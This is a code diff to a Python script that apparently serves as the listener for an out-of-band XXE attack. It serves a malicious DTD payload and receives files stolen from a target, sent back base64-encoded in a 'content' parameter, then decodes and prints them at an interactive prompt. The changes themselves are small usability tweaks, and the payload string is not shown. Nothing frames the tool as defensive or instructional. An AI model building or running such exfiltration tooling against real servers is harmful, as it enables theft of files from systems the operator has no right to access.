@@ -25,7 +25,6 @@ class RequestHandler(http.server.BaseHTTPRequestHandler):
 
         if self.path.endswith(".dtd"):
             # Make payload for DTD
-            print("Sending payload")
             self.wfile.write(payload.encode("utf-8"))
             return
         elif "content" in self.path:
@@ -34,10 +33,12 @@ class RequestHandler(http.server.BaseHTTPRequestHandler):
 
             b64_value = params["content"][0]
             decoded = b64decode(b64_value).decode()
-            print(f"Decoded Content: {decoded}")
+            print(f"\nDecoded Content:\n{decoded}\n")
+            print(terminal.prompt, end="", flush=True)
             return
         else:
             print("Uninteneded request: {}".format(self.path))
+            print(terminal.prompt, end="", flush=True)
             return
 
 
@@ -54,6 +55,9 @@ class Terminal(Cmd):
         # TODO To make the request from here itself, instead of burp
         print(f"The file is {line}")
 
+    def do_exit(self, arg):
+        exit()
+
 
 def run():
     server_address = ("", 8000)
@@ -62,6 +66,7 @@ def run():
 
 
 t = threading.Thread(target=run)
+t.daemon = True
 t.start()
 
 terminal = Terminal()
